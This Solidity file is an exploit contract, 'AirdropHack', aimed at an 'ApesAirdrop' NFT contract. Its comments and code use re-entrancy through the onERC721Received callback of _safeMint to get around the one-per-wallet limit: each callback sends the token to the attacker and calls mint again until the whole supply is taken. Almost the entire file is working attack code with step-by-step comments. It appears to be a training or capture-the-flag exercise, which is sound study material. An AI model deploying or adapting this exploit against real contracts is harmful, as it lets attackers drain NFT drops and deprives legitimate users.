// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// The purpose of this smart contract is to hack the ApesAirdrop smart contract
// We will bypass the 1 NFT / wallet restriction mint all the NFTs for the attacker

/* 

Attack Vector
[Context] AA's mint function utilizes _safeMint, which open it to re-entrancy. 
    The vulnerability lies in the embedded _checkOnERC721Received function.
    We can manipulate the function by including the expected onERC721Received 
        in our malicious contract. We will execute a tranfer after the call
        and prior to the expected result, which is the 'returns (bytes4 retval)'.
    And, 'retval == IERC721Receiver.onERC721Received.selector', so we will 
        need to include this as a return value within our attack.
    

*/

// Interface Setup
// Ensure we have an interface to interact with the ApesAirdrop (AA) contract
// Import all of the functions that we want to use - primarily the mint function
interface IApesAirdrop {

// mint: start the attack & use to manipulate for the expliot 
function mint() external returns (uint16);

// maxSupply(): to use for minting until we hit the supply (utilizing the automatic getter for the public variable)
// We could also use a static number. However we are avoiding hard-coding to allow for flexibility
function maxSupply() external returns (uint16); 

// transferFrom (as a result of ERC721 inheritance): transfer NFTs to the attacker
function transferFrom(address from, address to, uint256 tokenId) external;
}


// Contract Setup
contract AirdropHack {

// Setup the state variables 

// owner / attacker
address public owner; 

// interface 
IApesAirdrop target;

// Contructor, within the contract 
// Receive the address of the ApesAirdrop contract
constructor (address _targetAddy) {
 // Set the owner as the msg.sender, so we can transfer all of the NFTs to the attacker's account
owner = msg.sender;

// Define the ApesAirdrop contract address as the target, utilizing the created interface 
target = IApesAirdrop(_targetAddy);
}


// Attack Execution (within two functions)

// [Function 1] Call the mint function (external)
function attack () external {
target.mint();
}

// [Function 2] A onERC721Received function (external)
// Ensure we mimic all the inputs to be received, and transform for our contract
function onERC721Received (
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data) external returns (bytes4) {

 // Implement a check to ensure that the only msg.sender calling is the Airdrop contract we want to hack
    require(msg.sender == address(target), "Not authorized");
 
 // Transfer the NFT the owner address (we will use the transferFrom fucntion - included in interface)
                target.transferFrom(address(this), owner, _tokenId); 

//  IF "require(tokenId < maxSupply" such that we do not throw an error (minting more than allowed)
            if (_tokenId < target.maxSupply()) {
                // Execute attack, by calling the mint function again 
            target.mint();
            }
            //  At the end of onERC721Received , we will return retval (designed to mirror expectations)
            // The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector` 
        return AirdropHack.onERC721Received.selector;
}


}